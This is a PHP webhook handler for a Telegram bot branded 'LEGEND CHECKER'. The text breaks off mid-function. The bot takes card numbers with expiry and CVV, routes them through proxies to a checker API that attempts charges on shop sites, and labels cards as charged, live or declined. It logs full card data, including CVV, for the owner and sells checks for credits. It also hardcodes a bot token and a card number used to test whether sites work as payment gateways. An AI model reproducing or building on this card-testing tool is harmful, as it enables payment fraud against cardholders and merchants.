<?php
/**
 * Enhanced Telegram Bot Webhook Handler
 * Includes owner commands for full web management
 * Owner: @LEGEND_BL (ID: 5652614329)
 */

require_once 'config.php';
require_once 'database.php';
require_once 'auth.php';
require_once 'admin_manager.php';
require_once 'cc_logs_manager.php';
require_once 'autosh.php';


// Bot configuration
$bot_token = '7934355076:AAEHirX29ay1Q4m1EuXqXCt-1Tk9DpuLHLU';
$bot_api_url = "https://api.telegram.org/bot{$bot_token}/";

// Get incoming message
$input = file_get_contents('php://input');
$update = json_decode($input, true);

if (empty($update)) {
    http_response_code(200);
    exit;
}

$message = $update['message'] ?? ($update['edited_message'] ?? ($update['channel_post'] ?? null));
if (!$message) {
    http_response_code(200);
    exit;
}

$chat_id = $message['chat']['id'];
$user_id = $message['from']['id'];
$text = $message['text'] ?? '';
$username = $message['from']['username'] ?? 'Unknown';

// Database and managers
$db = Database::getInstance();
$adminManager = new AdminManager();
$ccLogger = new CCLogsManager();

/**
 * Authorization checks
 */
function isOwner($user_id) {
    global $adminManager;
    return $adminManager->isOwner($user_id);
}

function isAdmin($user_id) {
    global $adminManager;
    return $adminManager->isAdmin($user_id);
}

/**
 * Send message function
 */
function sendMessage($chat_id, $text, $reply_markup = null) {
    global $bot_api_url;
    
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    if ($reply_markup) {
        $data['reply_markup'] = json_encode($reply_markup);
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $bot_api_url . 'sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($result === false) {
        error_log('Telegram sendMessage error: ' . ($err ?: ('errno ' . $errno)));
        return ['ok' => false, 'description' => $err];
    }
    $decoded = json_decode($result, true);
    if (!($decoded['ok'] ?? false)) {
        error_log('Telegram sendMessage API error: ' . $result);
    }
    return $decoded;
}

/**
 * Utility: HTML escape helper
 */
function htmlEscape($value) {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

/**
 * Utility: Mask card details for Telegram display
 */
function maskCardForTelegram($card) {
    $card = trim($card);
    $parts = explode('|', $card);
    if (count($parts) !== 4) {
        return htmlEscape($card);
    }

    [$panRaw, $month, $year, $cvv] = $parts;
    $digitsOnly = preg_replace('/\D+/', '', $panRaw);
    if (strlen($digitsOnly) >= 10) {
        $visiblePrefix = substr($digitsOnly, 0, 6);
        $visibleSuffix = substr($digitsOnly, -4);
        $maskedBody = str_repeat('*', max(0, strlen($digitsOnly) - 10));
        $maskedPan = $visiblePrefix . $maskedBody . $visibleSuffix;
    } elseif ($digitsOnly !== '') {
        $visiblePrefix = substr($digitsOnly, 0, 4);
        $maskedBody = str_repeat('*', max(0, strlen($digitsOnly) - strlen($visiblePrefix)));
        $maskedPan = $visiblePrefix . $maskedBody;
    } else {
        $maskedPan = '****';
    }

    $maskedCvv = str_repeat('*', strlen(trim($cvv)));
    return htmlEscape($maskedPan . '|' . trim($month) . '|' . trim($year) . '|' . $maskedCvv);
}

/**
 * Utility: Interpret API status into UI status + type
 */
function interpretCardApiStatus($status) {
    $statusUpper = strtoupper(trim((string)$status));
    if ($statusUpper === '') {
        return ['ui_status' => 'UNKNOWN_STATUS', 'final_type' => 'UNKNOWN_STATUS'];
    }

    if (strpos($statusUpper, 'CC PARAMETER IS REQUIRED') !== false) {
        return ['ui_status' => 'API_ERROR: CC PARAMETER REQUIRED', 'final_type' => 'ERROR'];
    }

    if (strpos($statusUpper, 'THANK YOU') !== false || strpos($statusUpper, 'ORDER_PLACED') !== false) {
        return ['ui_status' => 'ORDER_PLACED', 'final_type' => 'CHARGED'];
    }

    if (strpos($statusUpper, 'CHARGE') !== false || strpos($statusUpper, 'CHARGED') !== false) {
        return ['ui_status' => 'CHARGED', 'final_type' => 'CHARGED'];
    }

    if (strpos($statusUpper, '3DS') !== false ||
        strpos($statusUpper, 'OTP_REQUIRED') !== false ||
        strpos($statusUpper, 'HANDLE IS EMPTY') !== false ||
        strpos($statusUpper, 'DELIVERY RATES ARE EMPTY') !== false) {
        return ['ui_status' => $statusUpper, 'final_type' => 'APPROVED'];
    }

    if (strpos($statusUpper, 'INSUFFICIENT_FUNDS') !== false ||
        strpos($statusUpper, 'INCORRECT_CVC') !== false ||
        strpos($statusUpper, 'INCORRECT_ZIP') !== false ||
        strpos($statusUpper, 'ZIP_INCORRECT') !== false) {
        return ['ui_status' => $statusUpper, 'final_type' => 'APPROVED'];
    }

    if (strpos($statusUpper, 'APPROVED') !== false || strpos($statusUpper, 'LIVE') !== false) {
        return ['ui_status' => $statusUpper, 'final_type' => 'APPROVED'];
    }

    if (strpos($statusUpper, 'EXPIRED_CARD') !== false || strpos($statusUpper, 'EXPIRE_CARD') !== false) {
        return ['ui_status' => 'EXPIRED_CARD', 'final_type' => 'DECLINED'];
    }

    if (strpos($statusUpper, 'DECLINED') !== false ||
        strpos($statusUpper, 'ERROR') !== false ||
        strpos($statusUpper, 'INVALID') !== false ||
        strpos($statusUpper, 'MISSING') !== false ||
        strpos($statusUpper, 'STORE BLOCKED') !== false ||
        strpos($statusUpper, 'REFUSED') !== false) {
        return ['ui_status' => $statusUpper, 'final_type' => 'DECLINED'];
    }

    return ['ui_status' => $statusUpper, 'final_type' => 'UNKNOWN_STATUS'];
}

/**
 * Utility: Emoji for card/site status types
 */
function getStatusEmojiForType($type) {
    $map = [
        'CHARGED' => '💰',
        'APPROVED' => '✅',
        'DECLINED' => '❌',
        'VALID' => '✅',
        'INVALID' => '⚠️',
        'ERROR' => '⚠️',
        'UNKNOWN_STATUS' => '❓'
    ];
    $upper = strtoupper($type ?? '');
    return $map[$upper] ?? '❓';
}

/**
 * Utility: Normalize user record (handles MongoDB documents)
 */
function normalizeUserRecord($user) {
    if (is_object($user)) {
        if (class_exists('MongoDB\Model\BSONDocument') && $user instanceof MongoDB\Model\BSONDocument) {
            return $user->getArrayCopy();
        }
        return (array)$user;
    }
    return $user ?? [];
}

/**
 * Utility: Format duration in milliseconds
 */
function formatDurationMs($milliseconds) {
    if ($milliseconds >= 1000) {
        return sprintf('%.2fs', $milliseconds / 1000);
    }
    return sprintf('%.0fms', $milliseconds);
}

/**
 * Main command handler
 */
function handleCommand($text, $chat_id, $user_id, $username) {
    global $db;
    
    $text = trim($text);
    $parts = explode(' ', $text);
    $command = strtolower($parts[0]);
    
    // Owner-only commands
    if (isOwner($user_id)) {
        switch ($command) {
            case '/addadmin':
                return handleAddAdmin($parts, $chat_id, $user_id);
            case '/removeadmin':
                return handleRemoveAdmin($parts, $chat_id, $user_id);
            case '/cclogs':
                return handleCCLogs($parts, $chat_id, $user_id);
            case '/getlogs':
                return handleGetLogs($parts, $chat_id, $user_id);
            case '/changeconfig':
                return handleChangeConfig($parts, $chat_id, $user_id);
            case '/settimeout':
                return handleSetTimeout($parts, $chat_id, $user_id);
            case '/setchat':
                return handleSetChat($parts, $chat_id, $user_id);
            case '/notif':
                return handleNotif($parts, $chat_id, $user_id);
            case '/getwebhook':
                return handleGetWebhook($chat_id, $user_id);
            case '/setwebhook':
                return handleSetWebhook($parts, $chat_id, $user_id);
            case '/systemstats':
                return handleSystemStats($chat_id, $user_id);
            case '/admins':
                return handleListAdmins($chat_id, $user_id);
        }
    }
    
    // Admin commands (includes owner)
    if (isAdmin($user_id)) {
        switch ($command) {
            case '/admin':
                return handleAdminMenu($chat_id, $user_id);
            case '/generate':
                return handleGenerateCredits($parts, $chat_id, $user_id);
            case '/broadcast':
                return handleBroadcast($parts, $chat_id, $user_id);
            case '/users':
                return handleListUsers($chat_id, $user_id);
            case '/addcredits':
                return handleAddCredits($parts, $chat_id, $user_id);
            case '/stats':
                return handleStats($chat_id, $user_id);
            case '/ban':
                return handleBan($parts, $chat_id, $user_id);
            case '/unban':
                return handleUnban($parts, $chat_id, $user_id);
        }
    }
    
    // Public commands
    switch ($command) {
        case '/start':
            return handleStart($chat_id, $user_id, $username);
        case '/ping':
            return handlePing($chat_id);
        case '/health':
            return handleHealth($chat_id);
        case '/credits':
            return handleCheckCredits($chat_id, $user_id);
        case '/claim':
            return handleClaimCredits($parts, $chat_id, $user_id);
        case '/check':
            return handleCheckCard($parts, $chat_id, $user_id);
        case '/site':
            return handleCheckSite($parts, $chat_id, $user_id);
        case '/help':
            return handleHelp($chat_id, $user_id);
        default:
            sendMessage($chat_id, "❓ Unknown command. Use /help to see available commands.");
    }
}

/**
 * Public Commands
 */
function handleStart($chat_id, $user_id, $username) {
    global $db;
    
    // Check if user exists, create if not
    $user = $db->getUserByTelegramId($user_id);
    if (!$user) {
        $user = $db->createUser([
            'id' => $user_id,
            'username' => $username,
            'first_name' => $username
        ]);
    }
    
    $owner_tag = isOwner($user_id) ? " 👑 <b>OWNER</b>" : (isAdmin($user_id) ? " 🛡️ <b>ADMIN</b>" : "");
    
    $welcome = "👋 <b>Welcome to LEGEND CHECKER!</b>{$owner_tag}\n\n";
    $welcome .= "💳 Advanced Card & Site Checking Bot\n\n";
    $welcome .= "🎯 <b>Quick Commands:</b>\n";
    $welcome .= "• /credits - Check balance\n";
    $welcome .= "• /claim &lt;code&gt; - Redeem credit code\n";
    $welcome .= "• /check &lt;card&gt; - Check card\n";
    $welcome .= "• /site &lt;url&gt; - Check site\n";
    $welcome .= "• /help - Full command list\n";
    
    if (isAdmin($user_id)) {
        $welcome .= "\n🛡️ <b>Admin Commands:</b>\n";
        $welcome .= "• /admin - Admin panel\n";
        $welcome .= "• /generate - Generate credits\n";
        $welcome .= "• /broadcast - Send announcement\n";
    }
    
    if (isOwner($user_id)) {
        $welcome .= "\n👑 <b>Owner Commands:</b>\n";
        $welcome .= "• /addadmin - Add admin\n";
        $welcome .= "• /cclogs - View CC logs\n";
        $welcome .= "• /systemstats - System stats\n";
    }
    
    $welcome .= "\n🌐 <b>Web Dashboard:</b>\n";
    $welcome .= AppConfig::DOMAIN;
    
    sendMessage($chat_id, $welcome);
}

function handleCheckCredits($chat_id, $user_id) {
    global $db;
    
    $user = $db->getUserByTelegramId($user_id);
    if (!$user) {
        sendMessage($chat_id, "❌ User not found. Use /start first.");
        return;
    }
    
    $credits = $user['credits'] ?? 0;
    $role = ucfirst($user['role'] ?? 'free');
    
    $msg = "💰 <b>Your Balance</b>\n\n";
    $msg .= "💳 <b>Credits:</b> {$credits}\n";
    $msg .= "🎭 <b>Role:</b> {$role}\n\n";
    $msg .= "💡 <b>Tip:</b> Use /claim &lt;code&gt; to redeem credits!";
    
    sendMessage($chat_id, $msg);
}

function handleClaimCredits($parts, $chat_id, $user_id) {
    global $db;
    
    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /claim &lt;code&gt;\nExample: /claim CREDIT-ABC123");
        return;
    }
    
    $code = strtoupper(trim($parts[1]));
    
    // Load credit codes
    $codes_file = __DIR__ . '/data/credit_codes.json';
    if (!file_exists($codes_file)) {
        sendMessage($chat_id, "❌ Invalid code.");
        return;
    }
    
    $codes = json_decode(file_get_contents($codes_file), true) ?? [];
    $found = false;
    
    foreach ($codes as &$code_data) {
        if ($code_data['code'] === $code && $code_data['status'] === 'active') {
            // Check if expired
            if (isset($code_data['expires_at']) && time() > $code_data['expires_at']) {
                sendMessage($chat_id, "❌ This code has expired.");
                return;
            }
            
            // Claim the code
            $amount = $code_data['credit_amount'] ?? 10;
            $result = $db->addCredits($user_id, $amount);
            
            if ($result) {
                $code_data['status'] = 'used';
                $code_data['used_by'] = $user_id;
                $code_data['used_at'] = time();
        
                file_put_contents($codes_file, json_encode($codes, JSON_PRETTY_PRINT));
        
                $user = $db->getUserByTelegramId($user_id);
                $new_balance = $user['credits'] ?? $amount;
        
                sendMessage($chat_id, "✅ <b>Code redeemed successfully!</b>\n💰 <b>+{$amount} credits</b>\n💳 <b>New Balance:</b> {$new_balance}");
                // Notify channel as well (honor SiteConfig overrides)
                $notifyChat = SiteConfig::get('notification_chat_id', TelegramConfig::CHAT_ID);
                if ($notifyChat && SiteConfig::get('notify_claim', true)) {
                    $msg = "💰 <b>Credit Code Redeemed</b>\n\n" .
                           "👤 <b>User ID:</b> {$user_id}\n" .
                           "➕ <b>Credits Added:</b> {$amount}\n" .
                           "💳 <b>New Balance:</b> {$new_balance}";
                    sendMessage($notifyChat, $msg);
                }
                $found = true;
                break;
            }
        }
    }
    
    if (!$found) {
        sendMessage($chat_id, "❌ Invalid or already used code.");
    }
}

function handleCheckCard($parts, $chat_id, $user_id) {
    global $db, $ccLogger;

    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /check &lt;card&gt; [site] [--proxy=ip:port:user:pass] [--noproxy]");
        return;
    }

    $cardInput = trim($parts[1]);
    if (strpos($cardInput, '|') === false) {
        // Allow formats like /check card|month|year|cvv site
        $cardInput = trim($parts[1] . ' ' . ($parts[2] ?? ''));
    }

    $extraArgs = array_slice($parts, 2);
    $site = null;
    $proxy = null;
    $useNoProxy = false;

    foreach ($extraArgs as $arg) {
        $arg = trim($arg);
        if ($arg === '') {
            continue;
        }

        if (stripos($arg, '--site=') === 0) {
            $site = trim(substr($arg, 7));
            continue;
        }

        if (stripos($arg, 'site=') === 0) {
            $site = trim(substr($arg, 5));
            continue;
        }

        if (stripos($arg, '--proxy=') === 0) {
            $proxy = trim(substr($arg, 8));
            continue;
        }

        if (stripos($arg, 'proxy=') === 0 && $proxy === null) {
            $proxy = trim(substr($arg, 6));
            continue;
        }

        if (stripos($arg, '--noproxy') === 0 || strtolower($arg) === 'noproxy') {
            $useNoProxy = true;
            $proxy = null;
            continue;
        }

        if ($site === null && (stripos($arg, 'http://') === 0 || stripos($arg, 'https://') === 0)) {
            $site = $arg;
        }
    }

    $cardParts = array_map('trim', explode('|', $cardInput));
    if (count($cardParts) !== 4) {
        sendMessage($chat_id, "❌ Invalid card format. Use: <code>number|MM|YYYY|CVV</code>");
        return;
    }

    [$panInput, $month, $yearInput, $cvvInput] = $cardParts;
    $cardNumberDigits = preg_replace('/\D+/', '', $panInput);
    if (!preg_match('/^\d{13,19}$/', $cardNumberDigits)) {
        sendMessage($chat_id, "❌ Invalid card number format. Provide 13-19 digits.");
        return;
    }

    if (!preg_match('/^(0[1-9]|1[0-2])$/', $month)) {
        sendMessage($chat_id, "❌ Invalid month. Use MM format (01-12).");
        return;
    }

    $yearNormalized = $yearInput;
    if (preg_match('/^\d{2}$/', $yearInput)) {
        $yearNormalized = '20' . $yearInput;
    }
    if (!preg_match('/^\d{4}$/', $yearNormalized)) {
        sendMessage($chat_id, "❌ Invalid year. Use YYYY or YY format.");
        return;
    }

    $cvvDigits = preg_replace('/\D+/', '', $cvvInput);
    if (!preg_match('/^\d{3,4}$/', $cvvDigits)) {
        sendMessage($chat_id, "❌ Invalid CVV. Provide 3 or 4 digits.");
        return;
    }

    $normalizedCard = $cardNumberDigits . '|' . $month . '|' . $yearNormalized . '|' . $cvvDigits;

    if ($site === null) {
        $site = SiteConfig::get('default_checker_site', 'https://shopify.com');
    }
    if (!filter_var($site, FILTER_VALIDATE_URL)) {
        sendMessage($chat_id, "❌ Invalid site URL. Provide a full URL including http(s)://");
        return;
    }

    $userRecord = normalizeUserRecord($db->getUserByTelegramId($user_id));
    if (empty($userRecord)) {
        sendMessage($chat_id, "❌ You are not registered. Use /start first.");
        return;
    }

    if (isset($userRecord['status']) && $userRecord['status'] === 'banned') {
        sendMessage($chat_id, "🚫 Your account is suspended. Contact support.");
        return;
    }

    $isOwner = in_array($user_id, AppConfig::OWNER_IDS, true);
    $creditCost = (int)SiteConfig::get('card_check_cost', AppConfig::CARD_CHECK_COST);
    if ($creditCost < 0) {
        $creditCost = AppConfig::CARD_CHECK_COST;
    }
    if ($isOwner) {
        $creditCost = 0;
    }

    $currentCredits = (int)($userRecord['credits'] ?? 0);
    if ($creditCost > 0 && $currentCredits < $creditCost) {
        sendMessage($chat_id, "❌ Insufficient credits. You need at least {$creditCost} credit(s) to check a card.");
        return;
    }

    $maskedCard = maskCardForTelegram($normalizedCard);
    $ackMessage = "⏳ <b>Checking card...</b>\n"
        . "💳 <b>Card:</b> <code>{$maskedCard}</code>\n"
        . "🔗 <b>Site:</b> " . htmlEscape($site);
    if ($proxy) {
        $ackMessage .= "\n🛰️ <b>Proxy:</b> " . htmlEscape($proxy);
    } elseif ($useNoProxy) {
        $ackMessage .= "\n🛰️ <b>Proxy:</b> Using your IP";
    }
    sendMessage($chat_id, $ackMessage);

    $apiUrl = SiteConfig::get('checker_api_url', AppConfig::CHECKER_API_URL);
    if (empty($apiUrl)) {
        $apiUrl = AppConfig::CHECKER_API_URL;
    }

    $queryParams = [
        'cc' => $normalizedCard,
        'site' => $site
    ];
    if ($useNoProxy) {
        $queryParams['noproxy'] = 1;
    } elseif (!empty($proxy)) {
        $queryParams['proxy'] = $proxy;
    }

    $fullUrl = $apiUrl . '?' . http_build_query($queryParams);
    $startTime = microtime(true);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $fullUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $reqTimeout = (int)SiteConfig::get('card_check_timeout', 90);
    $connTimeout = (int)SiteConfig::get('card_connect_timeout', 30);
    if ($reqTimeout > 0) {
        curl_setopt($ch, CURLOPT_TIMEOUT, $reqTimeout);
    }
    if ($connTimeout > 0) {
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
    }
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'LegendCheckerBot/1.0');

    $rawResponse = curl_exec($ch);
    $curlError = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $elapsedMs = round((microtime(true) - $startTime) * 1000, 2);

    $gateway = 'N/A';
    $price = '0.00';
    $proxyStatus = 'N/A';
    $proxyIp = 'N/A';
    $apiStatus = '';
    $uiStatus = 'API_ERROR';
    $finalType = 'ERROR';
    $warning = null;

    if ($curlError) {
        $uiStatus = 'API_ERROR: ' . $curlError;
    } elseif ($httpCode >= 400) {
        $uiStatus = 'API_ERROR: HTTP ' . $httpCode;
    } else {
        $responseData = json_decode($rawResponse, true);
        if (!is_array($responseData)) {
            $cleaned = trim((string)$rawResponse);
            $jsonStart = strpos($cleaned, '{');
            $jsonEnd = strrpos($cleaned, '}');
            if ($jsonStart !== false && $jsonEnd !== false && $jsonEnd > $jsonStart) {
                $cleaned = substr($cleaned, $jsonStart, $jsonEnd - $jsonStart + 1);
                $responseData = json_decode($cleaned, true);
            }
        }

        if (is_array($responseData)) {
            $apiStatus = $responseData['Response'] ?? $responseData['response'] ?? '';
            $gateway = $responseData['Gateway'] ?? $responseData['gateway'] ?? 'N/A';
            $price = $responseData['Price'] ?? $responseData['price'] ?? '0.00';
            $proxyStatus = $responseData['ProxyStatus'] ?? $responseData['proxy_status'] ?? 'N/A';
            $proxyIp = $responseData['ProxyIP'] ?? $responseData['proxy_ip'] ?? 'N/A';

            $statusInfo = interpretCardApiStatus($apiStatus);
            $uiStatus = $statusInfo['ui_status'];
            $finalType = $statusInfo['final_type'];
        } else {
            $uiStatus = 'API_ERROR: INVALID_JSON';
        }
    }

    $deductedCredits = false;
    $remainingCredits = $currentCredits;
    if ($creditCost > 0) {
        $deductedCredits = $db->deductCredits($user_id, $creditCost);
        if ($deductedCredits) {
            $freshRecord = normalizeUserRecord($db->getUserByTelegramId($user_id));
            $remainingCredits = (int)($freshRecord['credits'] ?? ($currentCredits - $creditCost));
        } else {
            $warning = 'Check completed but credit deduction failed.';
        }
    }

    try {
        $statusForLog = strtolower($finalType);
        if ($statusForLog === 'approved') {
            $statusForLog = 'live';
        }
        $ccLogger->logCCCheck([
            'telegram_id' => $user_id,
            'username' => $userRecord['username'] ?? 'Unknown',
            'card_number' => $cardNumberDigits,
            'card_full' => $normalizedCard,
            'status' => $statusForLog,
            'message' => $uiStatus,
            'gateway' => $gateway,
            'amount_charged' => ($finalType === 'CHARGED') ? (float)$price : 0,
            'currency' => 'USD',
            'proxy_status' => $proxyStatus,
            'proxy_ip' => $proxyIp
        ]);
    } catch (Exception $e) {
        error_log('Failed to log CC check: ' . $e->getMessage());
    }

    try {
        $db->logToolUsage($user_id, 'telegram_card_check', [
            'usage_count' => 1,
            'credits_used' => ($deductedCredits ? $creditCost : 0),
            'status' => strtolower($finalType),
            'response' => $uiStatus
        ]);
    } catch (Exception $e) {
        error_log('Failed to log tool usage: ' . $e->getMessage());
    }

    try {
        $ownerLogger = new OwnerLogger();
        $ownerPayload = $userRecord;
        $ownerPayload['telegram_id'] = $ownerPayload['telegram_id'] ?? $user_id;
        $ownerPayload['display_name'] = $ownerPayload['display_name'] ?? ($ownerPayload['first_name'] ?? $ownerPayload['username'] ?? 'User');
        $ownerLogger->sendUserActivity(
            $ownerPayload,
            'Telegram Card Check',
            'Site: ' . parse_url($site, PHP_URL_HOST) . ' | Result: ' . $finalType . ' (' . $uiStatus . ')'
        );
    } catch (Exception $e) {
        error_log('Owner logging failed: ' . $e->getMessage());
    }

    $statusDisplay = $apiStatus !== '' ? $apiStatus : $uiStatus;
    $emoji = getStatusEmojiForType($finalType);
    $proxyLine = '';
    if ($proxyStatus !== 'N/A' || $proxyIp !== 'N/A') {
        $proxyLine = "🛰️ <b>Proxy:</b> " . htmlEscape($proxyStatus);
        if ($proxyIp !== 'N/A') {
            $proxyLine .= " (" . htmlEscape($proxyIp) . ")";
        }
        $proxyLine .= "\n";
    }

    $creditsLine = '';
    if ($creditCost > 0) {
        $creditsLine = "💰 <b>Credits Used:</b> {$creditCost}\n"
            . "🏦 <b>Remaining Credits:</b> {$remainingCredits}\n";
    }

    $finalMessage = "{$emoji} <b>Card Check Result</b>\n\n"
        . "💳 <b>Card:</b> <code>{$maskedCard}</code>\n"
        . "🔗 <b>Site:</b> " . htmlEscape($site) . "\n"
        . "📣 <b>Response:</b> " . htmlEscape($statusDisplay) . "\n"
        . "🎯 <b>Status:</b> " . htmlEscape($finalType) . "\n"
        . "🏦 <b>Gateway:</b> " . htmlEscape($gateway) . "\n"
        . "💵 <b>Amount:</b> " . htmlEscape($price) . "\n"
        . $proxyLine
        . "⏱️ <b>Time:</b> " . formatDurationMs($elapsedMs) . "\n"
        . $creditsLine;

    if ($warning) {
        $finalMessage .= "\n⚠️ <i>" . htmlEscape($warning) . "</i>";
    }

    sendMessage($chat_id, $finalMessage);
}

function handleCheckSite($parts, $chat_id, $user_id) {
    global $db;

    if (count($parts) < 2) {
        sendMessage($chat_id, "❌ Usage: /site &lt;url&gt; [--proxy=ip:port:user:pass] [--noproxy]");
        return;
    }

    $siteInput = trim($parts[1]);
    $extraArgs = array_slice($parts, 2);
    $proxy = null;
    $useNoProxy = false;

    foreach ($extraArgs as $arg) {
        $arg = trim($arg);
        if ($arg === '') {
            continue;
        }

        if (stripos($arg, '--proxy=') === 0) {
            $proxy = trim(substr($arg, 8));
            continue;
        }

        if (stripos($arg, 'proxy=') === 0 && $proxy === null) {
            $proxy = trim(substr($arg, 6));
            continue;
        }

        if (stripos($arg, '--noproxy') === 0 || strtolower($arg) === 'noproxy') {
            $useNoProxy = true;
            $proxy = null;
            continue;
        }

        if ($siteInput === '' && (stripos($arg, 'http://') === 0 || stripos($arg, 'https://') === 0)) {
            $siteInput = $arg;
        }
    }

    if ($siteInput === '') {
        sendMessage($chat_id, "❌ Please provide a site URL to check.");
        return;
    }

    if (!preg_match('/^https?:\/\//i', $siteInput)) {
        $siteInput = 'https://' . $siteInput;
    }

    if (!filter_var($siteInput, FILTER_VALIDATE_URL)) {
        sendMessage($chat_id, "❌ Invalid site URL. Provide a full URL including http(s)://");
        return;
    }

    $userRecord = normalizeUserRecord($db->getUserByTelegramId($user_id));
    if (empty($userRecord)) {
        sendMessage($chat_id, "❌ You are not registered. Use /start first.");
        return;
    }

    if (isset($userRecord['status']) && $userRecord['status'] === 'banned') {
        sendMessage($chat_id, "🚫 Your account is suspended. Contact support.");
        return;
    }

    $isOwner = in_array($user_id, AppConfig::OWNER_IDS, true);
    $creditCost = (int)SiteConfig::get('site_check_cost', AppConfig::SITE_CHECK_COST);
    if ($creditCost < 0) {
        $creditCost = AppConfig::SITE_CHECK_COST;
    }
    if ($isOwner) {
        $creditCost = 0;
    }

    $currentCredits = (int)($userRecord['credits'] ?? 0);
    if ($creditCost > 0 && $currentCredits < $creditCost) {
        sendMessage($chat_id, "❌ Insufficient credits. You need at least {$creditCost} credit(s) to check a site.");
        return;
    }

    $ackMessage = "⏳ <b>Checking site...</b>\n"
        . "🔗 <b>Site:</b> " . htmlEscape($siteInput);
    if ($proxy) {
        $ackMessage .= "\n🛰️ <b>Proxy:</b> " . htmlEscape($proxy);
    } elseif ($useNoProxy) {
        $ackMessage .= "\n🛰️ <b>Proxy:</b> Using your IP";
    }
    sendMessage($chat_id, $ackMessage);

    $apiUrl = SiteConfig::get('checker_api_url', AppConfig::CHECKER_API_URL);
    if (empty($apiUrl)) {
        $apiUrl = AppConfig::CHECKER_API_URL;
    }

    $queryParams = [
        'cc' => '4390204117598548|11|2033|522',
        'site' => $siteInput
    ];

    if ($useNoProxy) {
        $queryParams['noproxy'] = 1;
    } elseif (!empty($proxy)) {
        $queryParams['proxy'] = $proxy;
    }

    $fullUrl = $apiUrl . '?' . http_build_query($queryParams);
    $startTime = microtime(true);

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $fullUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $reqTimeout = (int)SiteConfig::get('site_check_timeout', 90);
    $connTimeout = (int)SiteConfig::get('site_connect_timeout', 30);
    if ($reqTimeout > 0) {
        curl_setopt($ch, CURLOPT_TIMEOUT, $reqTimeout);
    }
    if ($connTimeout > 0) {
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connTimeout);
    }
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'LegendCheckerBot/1.0');

    $rawResponse = curl_exec($ch);
    $curlError = curl_error($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $elapsedMs = round((microtime(true) - $startTime) * 1000, 2);

    $gateway = 'N/A';
    $price = '0.00';
    $proxyStatus = 'N/A';
    $proxyIp = 'N/A';
    $apiStatus = '';
    $uiStatus = 'SITE_TIMEOUT_OR_ERROR';
    $finalType = 'ERROR';
    $warning = null;

    if ($curlError) {
        $uiStatus = 'API_ERROR: ' . $curlError;
    } elseif ($httpCode >= 400) {
        $uiStatus = 'API_ERROR: HTTP ' . $httpCode;
    } else {
        $responseData = json_decode($rawResponse, true);
        if (!is_array($responseData)) {
            $cleaned = trim((string)$rawResponse);
            $jsonStart = strpos($cleaned, '{');
            $jsonEnd = strrpos($cleaned, '}');
            if ($jsonStart !== false && $jsonEnd !== false && $jsonEnd > $jsonStart) {
                $cleaned = substr($cleaned, $jsonStart, $jsonEnd - $jsonStart + 1);
                $responseData = json_decode($cleaned, true);
            }
        }

        if (is_array($responseData)) {
            $apiStatus = $responseData['Response'] ?? $responseData['response'] ?? '';
            $gateway = $responseData['Gateway'] ?? $responseData['gateway'] ?? 'N/A';
            $price = $responseData['Price'] ?? $responseData['price'] ?? '0.00';
            $proxyStatus = $responseData['ProxyStatus'] ?? $responseData['proxy_status'] ?? 'N/A';
            $proxyIp = $responseData['ProxyIP'] ?? $responseData['proxy_ip'] ?? 'N/A';

            $validStatuses = [
                'card_decline',
                'card_declined',
                'generic_error',
                '3ds',
                '3ds cc',
                'fraud_suspected',
                'insufficient_funds',
                'incorrect_number',
                'incorrect_cvc',
                'incorrect_zip',
                'expired_card',
                'processing_error',
                'handle is empty'
            ];

            $statusLower = strtolower($apiStatus);
            $isValid = in_array($statusLower, $validStatuses, true);
            if ($isValid) {
                $uiStatus = 'VALID_SITE: ' . $apiStatus;
                $finalType = 'VALID';
            } else {
                $uiStatus = 'INVALID_SITE: ' . $apiStatus;
                $finalType = 'INVALID';
            }
        } else {
            $uiStatus = 'API_ERROR: INVALID_JSON';
        }
    }

    $deductedCredits = false;
    $remainingCredits = $currentCredits;
    if ($creditCost > 0) {
        $deductedCredits = $db->deductCredits($user_id, $creditCost);
        if ($deductedCredits) {
            $freshRecord = normalizeUserRecord($db->getUserByTelegramId($user_id));
            $remainingCredits = (int)($freshRecord['credits'] ?? ($currentCredits - $creditCost));
        } else {
            $warning = 'Check completed but credit deduction failed.';
        }
    }

    try {
        $db->logToolUsage($user_id, 'telegram_site_check', [
            'usage_count' => 1,
            'credits_used' => ($deductedCredits ? $creditCost : 0),
            'status' => strtolower($finalType),
            'response' => $uiStatus
        ]);
    } catch (Exception $e) {
        error_log('Failed to log site check usage: ' . $e->getMessage());
    }

    try {
        $ownerLogger = new OwnerLogger();
        $ownerPayload = $userRecord;
        $ownerPayload['telegram_id'] = $ownerPayload['telegram_id'] ?? $user_id;
        $ownerPayload['display_name'] = $ownerPayload['display_name'] ?? ($ownerPayload['first_name'] ?? $ownerPayload['username'] ?? 'User');
        $ownerLogger->sendUserActivity(
            $ownerPayload,
            'Telegram Site Check',
